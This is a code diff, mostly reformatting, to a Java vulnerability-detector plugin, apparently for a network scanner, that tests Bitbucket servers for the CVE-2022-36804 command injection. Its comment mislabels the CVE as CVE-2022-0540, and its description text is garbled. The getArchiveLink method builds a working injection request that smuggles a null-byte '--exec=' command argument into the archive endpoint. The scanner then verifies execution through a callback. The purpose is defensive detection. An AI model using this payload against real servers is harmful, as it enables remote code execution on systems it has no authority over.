@@ -34,20 +34,22 @@ import java.util.Iterator;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-/** A {@link VulnDetector} that detects the CVE-2022-0540 vulnerability. Reading */
+/**
+ * A {@link VulnDetector} that detects the CVE-2022-0540 vulnerability. Reading
+ */
 @PluginInfo(
         type = PluginType.VULN_DETECTION,
         name = "Cve202236804VulnDetector",
         version = "0.1",
         description =
                 "A vulnerability in Bitbucket allows a remote, An attacker with access "
-                    +   "to a public Bitbucket repository or with read permissions to a"
-                    +   "private one can execute arbitrary code by sending a malicious "
-                    +   "HTTP request. This All versions released after 6.10.17 "
-                    +   "including 7.0.0 and newer are affected, this means that all "
-                    +   "instances that are running any versions between 7.0.0 and "
-                    +   "8.3.0 inclusive can be exploited by this vulnerability.",
-        author = "SuperX",
+                        + "to a public Bitbucket repository or with read permissions to a"
+                        + "private one can execute arbitrary code by sending a malicious "
+                        + "HTTP request. This All versions released after 6.10.17 "
+                        + "including 7.0.0 and newer are affected, this means that all "
+                        + "instances that are running any versions between 7.0.0 and "
+                        + "8.3.0 inclusive can be exploited by this vulnerability.",
+        author = "SuperX.SIR",
         bootstrapModule = Cve202236804DetectorBootstrapModule.class)
 public class Cve202236804VulnDetector implements VulnDetector {
 
@@ -100,7 +102,7 @@ public class Cve202236804VulnDetector implements VulnDetector {
                                 PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
                         .build();
 
-        if(!payloadGenerator.isCallbackServerEnabled()){
+        if (!payloadGenerator.isCallbackServerEnabled()) {
             return false;
         }
         Payload payload = this.payloadGenerator.generate(config);
@@ -115,10 +117,9 @@ public class Cve202236804VulnDetector implements VulnDetector {
             if (httpResponse.status().code() == 200
                     && httpResponse.bodyString().get().contains(STRING_PUB_REP)) {
                 String Publink = getArchiveLink(getPubLink(String.valueOf(httpResponse.bodyString())), URLEncoder.encode(commandToInject));
-                if(Publink.length() == 0){
+                if (Publink.length() == 0) {
                     return false;
-                }
-                else{
+                } else {
                     httpClient.send(get(buildTargetUrl(networkService, Publink)).withEmptyHeaders().build(), networkService);
 
                     return payload.checkIfExecuted();
@@ -133,21 +134,21 @@ public class Cve202236804VulnDetector implements VulnDetector {
     }
 
 
-    private String getPubLink(String response){
+    private String getPubLink(String response) {
         String publink = "";
         Matcher matcher = Pattern.compile("<script>require\\('bitbucket/internal/page/global-repository-list/global-repository-list'\\)\\.init\\( document\\.getElementById\\('repository-container'\\),\\{repositoryPage: (.*),\\}\\);</script>").matcher(response);
-        if(matcher.find()) {
+        if (matcher.find()) {
             String res = matcher.group(1);
             JsonElement rootElement = JsonParser.parseString(res);
             JsonObject repositoryPage = rootElement.getAsJsonObject();
-            if (repositoryPage.get("size").getAsInt() > 0){
+            if (repositoryPage.get("size").getAsInt() > 0) {
 
                 JsonArray values = repositoryPage.getAsJsonArray("values");
-                for(int i = 0; i < repositoryPage.get("size").getAsInt(); i ++) {
+                for (int i = 0; i < repositoryPage.get("size").getAsInt(); i++) {
                     //Boolean isPublic = values.get(i).getAsJsonObject().get("public").getAsBoolean();
                     JsonArray selfs = values.get(i).getAsJsonObject().getAsJsonObject("links").getAsJsonArray("self");
                     Iterator self = selfs.iterator();
-                    while(self.hasNext()){
+                    while (self.hasNext()) {
                         JsonElement hreflink = (JsonElement) self.next();
                         publink = hreflink.getAsJsonObject().get("href").getAsString();
                         return publink;
@@ -160,17 +161,16 @@ public class Cve202236804VulnDetector implements VulnDetector {
 
     private String getArchiveLink(String publink, String commandToInject) throws MalformedURLException {
         String archiveLink = "";
-        if(publink.length() == 0) {
+        if (publink.length() == 0) {
             return archiveLink;
-        }
-        else{
+        } else {
             URL url = new URL(publink);
-            archiveLink = "rest/api/latest" + url.getPath().substring(0, url.getPath().lastIndexOf("/")) + "/archive?format=zip&prefix=123%00--exec="+ commandToInject +
-            "%00--remote=git@g.com/a/b";
+            archiveLink = "rest/api/latest" + url.getPath().substring(0, url.getPath().lastIndexOf("/")) + "/archive?format=zip&prefix=123%00--exec=" + commandToInject +
+                    "%00--remote=git@g.com/a/b";
             //logger.atInfo().log("archiveLink urldecode %s ", archiveLink);
             return archiveLink;
         }
-   }
+    }
 
     private DetectionReport buildDetectionReport(
             TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
@@ -190,12 +190,12 @@ public class Cve202236804VulnDetector implements VulnDetector {
                                         "CVE-2022-36804: Bitbucket Command injection vulnerability")
                                 .setDescription(
                                         "A vulnerability in Bitbucket allows a remote, An attacker with access "
-                                                +   "to a public Bitbucket repository or with read permissions to a"
-                                                +   "private one can execute arbitrary code by sending a malicious "
-                                                +   "HTTP request. This All versions released after 6.10.17 "
-                                                +   "including 7.0.0 and newer are affected, this means that all "
-                                                +   "instances that are running any versions between 7.0.0 and "
-                                                +   "8.3.0 inclusive can be exploited by this vulnerability.")
+                                                + "to a public Bitbucket repository or with read permissions to a"
+                                                + "private one can execute arbitrary code by sending a malicious "
+                                                + "HTTP request. This All versions released after 6.10.17 "
+                                                + "including 7.0.0 and newer are affected, this means that all "
+                                                + "instances that are running any versions between 7.0.0 and "
+                                                + "8.3.0 inclusive can be exploited by this vulnerability.")
                                 .setRecommendation("Upgrade bitbucket to the latest version"))
                 .build();
     }
